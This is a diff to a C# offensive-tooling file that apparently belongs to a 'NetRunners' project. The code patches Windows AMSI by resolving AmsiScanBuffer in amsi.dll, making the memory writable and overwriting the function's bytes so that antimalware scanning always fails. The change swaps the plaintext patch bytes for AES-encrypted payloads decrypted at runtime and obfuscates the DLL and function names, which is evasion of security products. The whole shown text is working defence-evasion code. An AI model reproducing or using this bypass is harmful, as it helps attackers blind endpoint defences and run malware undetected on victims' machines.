@@ -31,25 +31,24 @@ namespace NetRunners.Patchers
 
                 byte[] patch;
                 // define patch var using bitness
-                patch = IntPtr.Size == 8 ? new byte[] { 0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+                patch = (System.Environment.Is64BitProcess) ? 
+                    DecryptionAlgorithms.Decryptor.DecryptBytesToBytes_Aes(AmsiPatch, AesKey, AesIV) :          // x64 payload
+                    DecryptionAlgorithms.Decryptor.DecryptBytesToBytes_Aes(AmsiPatch86, AesKey, AesIV);         // x86 payload
 
+                //////// AMSISCANBUFFER
                 // get amsi.dll pointer
                 IntPtr Library = LoadLibraryA(Decrypt(amsidll_Byte));
                 if (Library == IntPtr.Zero)
                     throw new InvalidOperationException($"LoadLibraryA failed with error code: {Marshal.GetLastWin32Error()}");
-
-                //////// AMSISCANBUFFER
                 // get amsiscanbuffer pointer
                 IntPtr funcAddress = GetProcAddress(Library, Decrypt(AmsiScanBuffer_Byte));
                 if (funcAddress == IntPtr.Zero)
                     throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");
 
-                // fix memory protections of amsiscanbuffer
+                // change memory protections
                 VirtualProtect(funcAddress, (UIntPtr)3, 0x40, out oldProtect);
-
                 // patch bytes using our payload
                 Marshal.Copy(patch, 0, funcAddress, patch.Length);
-
                 // restore memory protection
                 VirtualProtect(funcAddress, (UIntPtr)3, 0x20, out oldProtect);
 
